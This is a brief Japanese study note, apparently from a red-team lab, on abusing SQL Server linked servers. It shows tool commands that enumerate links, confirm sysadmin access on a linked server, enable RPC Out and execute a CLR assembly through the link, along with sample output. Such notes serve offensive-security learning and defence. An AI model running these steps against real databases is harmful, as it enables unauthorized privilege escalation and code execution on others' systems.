### Linked Serversとは
SQL Serverが**他のデータソース（別のSQL Server等）と接続を持てる機能**です。本来は複数DBにまたがるクエリを一元化するための管理機能

### 悪用方法
リンクを確認
```
sql-links lon-db-1
```

リンク先へのクエリ実行
```
sql-query lon-db-1 "SELECT @@SERVERNAME" "" lon-db-2
```

セキュリティコンテキストの確認
今回は `rsteel`（一般ユーザー想定）がリンク経由で**sysadminとして接続**できている状態
```
sql-whoami lon-db-1 "" lon-db-2
```
出力
```
[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Determining user permissions on lon-db-2 via lon-db-1
[*] Logged in as CONTOSO\rsteel
~
 |--> User is a member of the sysadmin role
~
```

RPC Outの確認と有効化
**RPC Out**はリンク先でストアドプロシージャを呼び出すために必要な設定
```
sql-enablerpc lon-db-1 lon-db-2
```

リンク先が0の時は無効化されている。無効化されていればストアドプロシージャの実行（xp_cmdshell/OLE/CLR等）不可
```
→ LON-DB-2: is_rpc_out_enabled = 0
```

有効化
```
sql-enablerpc lon-db-1 lon-db-2
```

リンク越しにCLR実行
```
sql-clr lon-db-1 ClassLibrary1.dll MyProcedure "" lon-db-2
```